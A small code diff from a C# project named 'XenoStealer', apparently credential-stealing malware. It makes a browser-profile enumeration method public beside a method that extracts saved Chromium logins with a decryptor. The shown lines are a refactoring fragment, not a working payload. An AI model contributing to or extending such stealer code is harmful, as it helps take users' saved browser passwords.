@@ -103,7 +103,7 @@ namespace XenoStealer
             return browsers.ToArray();
         }
 
-        private static string[] GetProfiles(string userDataPath) 
+        public static string[] GetProfiles(string userDataPath) 
         {
             List<string> profiles = new List<string>();
             if (!Directory.Exists(Path.Combine(userDataPath, "Default"))) 
@@ -129,7 +129,6 @@ namespace XenoStealer
 
             return profiles.ToArray();
         }
-
 
         public static DataExtractionStructs.ChromiumLogin[] GetLogins(string profilePath, ChromeDecryptor decryptor) 
         {
